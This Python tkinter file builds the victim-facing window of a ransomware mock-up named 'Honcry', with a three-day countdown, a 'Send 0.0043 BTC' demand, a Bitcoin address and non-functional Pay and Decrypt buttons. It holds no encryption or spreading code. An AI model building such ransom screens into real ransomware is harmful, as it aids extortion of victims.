import tkinter as tk
from tkinter import ttk
import pyautogui
from PIL import Image, ImageTk
import json
import os
import datetime

def styles():
    style = ttk.Style()
    
    style.configure("Himg.TLabel",
                    background="#FA0000")
    
    style.configure("TB.TLabel",
                    foreground="#FFFFFF",
                    background="#910000",
                    font=("Comic Sans MS", 20))
    
    style.configure("RIT.TLabel",
                    foreground="#000000",
                    background="#FFFFFF",
                    font=("Comic Sans MS", 20))
    
    style.configure("btn.TButton",
                    foreground="#000000",
                    background="#FFFFFF",
                    font=("Comic Sans MS", 20))

def windowInit():
    global root
    root = tk.Tk()
    root.title("Honcry")
    root.iconbitmap("./images/lock.ico")
    root.configure(bg="#910000")
    width, height, x, y = 900, 700, pyautogui.size().width // 2, pyautogui.size().height // 2
    root.geometry(f"{width}x{height}+{x-width//2}+{y-height//2}")
    root.resizable(False, False)

    homePage()

def homePage():
    def lockImage():
        LFrame = tk.Frame(root,width=128,height=128,bd=2,relief="raise")
        LFrame.place(x=30,y=30)
        img = Image.open("./images/lock.png")
        img = img.resize((128,128))
        img = ImageTk.PhotoImage(img)
        lockImg = ttk.Label(LFrame,image=img,anchor="center",style="Himg.TLabel")
        lockImg.image = img
        lockImg.pack()

    def timeLeftAndBTCAddr():
        def __timeleftCal():
            testPath,__rmfolderPath = "./data/lock.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/lock.json"
            with open(testPath,"r") as file:
                data = json.load(file)
            return datetime.datetime.strptime(data["lockTime"],"%Y-%m-%d %H:%M:%S") + datetime.timedelta(days=3) - datetime.datetime.now()
        
        def updateCountdown(label):
            def format_remaining_time(remaining_time):
                days = remaining_time.days
                hours, remainder = divmod(remaining_time.seconds, 3600)
                minutes, seconds = divmod(remainder, 60)
                return f"{days:02}:{hours:02}:{minutes:02}:{seconds:02}"
            
            timeleft = __timeleftCal()
            if(timeleft.total_seconds() >0):
                label.config(text=f"Time Left: {format_remaining_time(timeleft)}")
                label.after(1000,updateCountdown,label)
            else:
                label.config(text="Time Left: 0")

        TBFrame = tk.Frame(root,width=650,height=130,background="#910000",bd=2,relief="sunken")
        TBFrame.place(x=200,y=30)
        TBFrame.pack_propagate(False)
        timeLeftLabel = ttk.Label(TBFrame,text="Time Left:",style="TB.TLabel")
        timeLeftLabel.place(x=0,y=0)
        updateCountdown(timeLeftLabel)

        ttk.Label(TBFrame,text="Send 0.0043 BTC to the following address",style="TB.TLabel").place(x=0,y=50)
        img = Image.open("./images/bitcoin.png")
        img = img.resize((img.width//3,img.height//3))
        img = ImageTk.PhotoImage(img)
        bitcoinImage = ttk.Label(TBFrame,image=img)
        bitcoinImage.image = img
        bitcoinImage.place(x=0,y=90)
        bitcoinAddr = ttk.Entry(TBFrame,width=45,style="TBE.TEntry",font=("Comic Sans MS", 13))
        bitcoinAddr.insert(0,"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
        bitcoinAddr.place(x=150,y=90)
        bitcoinAddr.config(state="readonly")

    def ransomInstructions():
        RIFrame = tk.Frame(root,width=825,height=400,background="#FFFFFF",bd=2)
        RIFrame.place(x=30,y=180)
        RIFrame.pack_propagate(False)
        ttk.Label(RIFrame,text="勒索說明",style="RIT.TLabel").pack(side="top")

    def btn():
        btnFrame = tk.Frame(root,width=825,height=100,background="#910000")
        btnFrame.place(x = 30,y = 550)
        btnFrame.pack_propagate(False)
        payBTN = ttk.Button(btnFrame,text="Pay",style="btn.TButton")
        decryptionBTN = ttk.Button(btnFrame,text="Decrypto",style="btn.TButton")
        payBTN.pack(side='left',padx=100)
        decryptionBTN.pack(side='right',padx=100)

    lockImage()
    timeLeftAndBTCAddr()
    ransomInstructions()
    btn()

def run():
    print("victim window")
    windowInit()
    styles()
    root.mainloop()

# if __name__ == "__main__":
#     run()